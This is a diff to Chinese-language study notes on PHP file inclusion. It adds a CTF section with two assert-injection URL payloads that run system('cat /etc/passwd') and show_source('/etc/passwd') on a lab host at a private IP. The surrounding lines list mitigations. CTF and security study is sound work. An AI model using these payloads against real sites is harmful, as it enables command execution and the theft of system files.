@@ -597,6 +597,15 @@ expect://伪协议用来执行系统命令，但是需要安装拓展
 - 修改PHP配置文件，将open_basedir的值设置为可以包含的特定目录，后面要加/，例如open_basedir=/var/www/html/
 - 修改PHP配置文件，关闭allow_url_include
 
+## CTF考题
+
+ASSERT
+
+```bash
+view-source:http://192.168.88.129/index.php?page=./blog' and die(system('cat /etc/passwd')) or '
+view-source:http://192.168.88.129/index.php?page=./blog' and die(show_source('/etc/passwd')) or '
+```
+
 
 
 
